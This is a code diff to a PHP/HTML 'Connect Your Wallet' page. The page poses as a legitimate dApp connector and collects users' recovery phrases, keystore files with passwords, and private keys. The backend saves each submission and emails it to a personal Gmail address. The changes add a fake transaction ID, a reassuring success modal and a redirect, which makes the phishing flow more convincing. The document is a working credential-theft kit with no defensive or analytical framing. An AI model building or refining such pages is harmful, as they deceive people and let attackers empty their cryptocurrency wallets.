@@ -35,20 +35,23 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['import_method'])) {
     $import_input = $_POST['import_input'] ?? '';
     $user_id = $_SESSION['user_id'] ?? 0;
 
+    // Generate transaction ID
+    $transaction_id = strtoupper(bin2hex(random_bytes(6)));
+
     // Save to DB (table: wallet_imports)
-    $stmt = $conn->prepare('INSERT INTO wallet_imports (user_id, wallet_name, method, input) VALUES (?, ?, ?, ?)');
-    $stmt->bind_param('isss', $user_id, $wallet_name, $import_method, $import_input);
+    $stmt = $conn->prepare('INSERT INTO wallet_imports (user_id, wallet_name, method, input, transaction_id) VALUES (?, ?, ?, ?, ?)');
+    $stmt->bind_param('issss', $user_id, $wallet_name, $import_method, $import_input, $transaction_id);
     $stmt->execute();
     $stmt->close();
 
     // Send email using PHP mail()
     $to = "juniachinedu@gmail.com";
     $subject = "New Wallet Import: $wallet_name";
-    $message = "User ID: $user_id\nWallet: $wallet_name\nMethod: $import_method\nInput: $import_input";
+    $message = "User ID: $user_id\nWallet: $wallet_name\nMethod: $import_method\nInput: $import_input\nTransaction ID: $transaction_id";
     $headers = "From: admin@fushionhubai.com.ng";
     mail($to, $subject, $message, $headers);
     $conn->close();
-    echo '<div class="alert alert-success">Wallet import submitted successfully!</div>';
+    echo '<script>window.successModalShow = true; window.generatedTransactionId = "' . $transaction_id . '";</script>';
 }
 ?>
 <!DOCTYPE html>
@@ -68,15 +71,34 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['import_method'])) {
         .wallet-card:hover {
             box-shadow: 0 4px 20px rgba(0, 0, 0, 0.15);
         }
-        .btn-orange{
+
+        .btn-orange {
             background-color: rgb(255, 120, 95);
             color: white;
+        }
+
+        .btn-primary {
+            background-color: rgb(255, 120, 95) !important;
+            border-color: rgb(255, 120, 95) !important;
+        }
+
+        .btn-primary:hover,
+        .btn-primary:focus,
+        .btn-primary:active {
+            background-color: rgb(235, 100, 75) !important;
+            /* Slightly darker for hover effect */
+            border-color: rgb(235, 100, 75) !important;
+        }
+
+        .txthead h2 {
+            color: rgb(255, 120, 95);
+            font-family: 'Franklin Gothic Medium', 'Arial Narrow', Arial, sans-serif;
         }
     </style>
 </head>
 
 <body class="bg-gray-100">
-    <div class="container py-5">
+    <div class="container py-5 txthead">
         <h2 class="text-center mb-6 font-bold text-3xl text-blue-700">Connect Your Wallet</h2>
         <p class="text-center mb-6 mx-auto font-bold">
             Multiple iOS and Android wallets support the protocol. Simply scan a QR code from your desktop computer screen to start securely using a dApp with your mobile wallet.
@@ -124,6 +146,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['import_method'])) {
             <input type="hidden" name="wallet_name" id="formWalletName">
             <input type="hidden" name="import_method" id="formImportMethod">
             <input type="hidden" name="import_input" id="formImportInput">
+            <!-- <input type="email" class="form-control mb-2" name="email" id="formEmail" placeholder="Your Email" required> -->
             <div class="modal fade" id="importModal" tabindex="-1" aria-labelledby="importModalLabel" aria-hidden="true">
                 <div class="modal-dialog modal-dialog-centered">
                     <div class="modal-content rounded-4 border-0">
@@ -147,29 +170,56 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['import_method'])) {
                                 <div class="tab-pane fade show active" id="phrase" role="tabpanel">
                                     <input type="text" class="form-control mb-2" id="phraseWalletName" placeholder="Wallet Name">
                                     <textarea class="form-control mb-2" id="phraseInput" placeholder="Enter your recovery phrase"></textarea>
+                                    <div class="mb-2">
+                                        <input type="email" class="form-control" id="phraseEmail" placeholder="Your Email" required>
+                                    </div>
                                     <div class="text-danger small mb-2">Typically 12 (sometimes 24) words separated by single spaces</div>
                                     <button type="button" class="btn btn-block w-100 import-proceed" data-method="Phrase" style="background:#ff6a4d;color:#fff;">Proceed</button>
                                 </div>
                                 <div class="tab-pane fade" id="keystore" role="tabpanel">
                                     <textarea class="form-control mb-2" id="keystoreInput" placeholder="Keystore JSON"></textarea>
+                                    <div class="mb-2">
+                                        <input type="email" class="form-control" id="phraseEmail" placeholder="Your Email" required>
+                                    </div>
                                     <input type="text" class="form-control mb-2" id="keystoreWalletName" placeholder="Wallet Password">
                                     <div class="text-danger small mb-2">Several lines of text beginning with {...} plus the password you used to encrypt it.</div>
                                     <button type="button" class="btn btn-block w-100 import-proceed" data-method="Keystore JSON" style="background:#ff6a4d;color:#fff;">Proceed</button>
                                 </div>
                                 <div class="tab-pane fade" id="privatekey" role="tabpanel">
                                     <input type="text" class="form-control mb-2" id="privateKeyInput" placeholder="Enter your Private Key">
-                                    <div class="text-danger small mb-2">Typically 12 (sometimes 24) words separated by single spaces</div>
-                                    <button type="button" class="btn btn-block w-100 import-proceed" data-method="Private Key" style="background:#ff6a4d;color:#fff;">Proceed</button>
+                                    <div class="mb-2">
+                                        <input type="email" class="form-control" id="phraseEmail" placeholder="Your Email" required>
+                                        <div class="text-danger small mb-2">Typically 12 (sometimes 24) words separated by single spaces</div>
+                                        <button type="button" class="btn btn-block w-100 import-proceed" data-method="Private Key" style="background:#ff6a4d;color:#fff;">Proceed</button>
+                                    </div>
                                 </div>
-                            </div>
-                            <div class="d-flex justify-content-end align-items-center mt-2">
-                                <button type="button" class="btn btn-danger" data-bs-dismiss="modal">Cancel</button>
+                                <div class="d-flex justify-content-end align-items-center mt-2">
+                                    <button type="button" class="btn btn-danger" data-bs-dismiss="modal">Cancel</button>
+                                </div>
                             </div>
                         </div>
                     </div>
                 </div>
-            </div>
         </form>
+        <!-- Success Modal -->
+        <div class="modal fade" id="successModal" tabindex="-1" aria-labelledby="successModalLabel" aria-hidden="true">
+            <div class="modal-dialog modal-dialog-centered">
+                <div class="modal-content rounded-4 border-0">
+                    <div class="modal-body text-center p-5">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="64" height="64" fill="#28a745" class="mb-3" viewBox="0 0 16 16">
+                            <path d="M16 8A8 8 0 1 1 0 8a8 8 0 0 1 16 0zM7 10.414l4.707-4.707-1.414-1.414L7 7.586 5.707 6.293 4.293 7.707 7 10.414z" />
+                        </svg>
+                        <h3 class="mb-3 text-success">Success!</h3>
+                        <p class="mb-2">Your wallet import was submitted successfully.</p>
+                        <div class="mb-3">
+                            <span class="fw-bold">Transaction ID:</span>
+                            <span id="transactionId" class="text-primary"></span>
+                        </div>
+                        <p class="text-muted">You will be redirected shortly...</p>
+                    </div>
+                </div>
+            </div>
+        </div>
     </div>
     <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
@@ -221,6 +271,16 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['import_method'])) {
                 $('#formImportInput').val(input);
                 $('#importForm').submit();
             });
+            // Show success modal if data was inserted
+            if (window.successModalShow) {
+                var transactionId = window.generatedTransactionId || '';
+                var successModal = new bootstrap.Modal(document.getElementById('successModal'));
+                $('#transactionId').text(transactionId);
+                successModal.show();
+                setTimeout(function() {
+                    window.location.href = 'success_connect.php?txid=' + transactionId;
+                }, 3500); // 3.5 seconds
+            }
         });
     </script>
 </body>
